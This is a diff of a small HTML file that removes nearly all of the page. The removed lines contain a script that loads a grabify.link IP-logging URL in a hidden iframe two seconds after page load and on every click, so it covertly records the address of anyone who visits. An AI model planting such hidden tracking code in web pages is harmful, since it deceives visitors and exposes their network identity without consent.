@@ -1,47 +1,4 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <style>
-        /* Set the background image and style to fit the screen */
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://cdn.discordapp.com/attachments/1137458122823319605/1137774742129086505/Arman.png') no-repeat center center fixed;
-            background-size: cover;
-        }
-        /* Add some content to display on top of the image */
-        h1 {
-            text-align: center;
-            padding-top: 50px;
-            color: white;
-        }
-        p {
-            text-align: center;
-            color: white;
-        }
-    </style>
-    <script>
-        function openWebsiteInBackground() {
-            // Replace "https://www.example.com" with the URL of the website you want to open in the background
-            var websiteUrl = "https://grabify.link/7GKCPM";
-            
-            // Open the website in a hidden iframe to keep it in the background
-            var iframe = document.createElement("iframe");
-            iframe.style.display = "none";
-            iframe.src = websiteUrl;
-            document.body.appendChild(iframe);
-        }
 
-        // Call the openWebsiteInBackground function after 5 seconds (5000 milliseconds)
-        setTimeout(openWebsiteInBackground, 2000);
-
-        document.addEventListener("click", function() {
-            openWebsiteInBackground();
-        });
-
-    </script>
-</head>
-<body>
-    <!-- Content to be displayed on top of the image -->
-</body>
 </html>
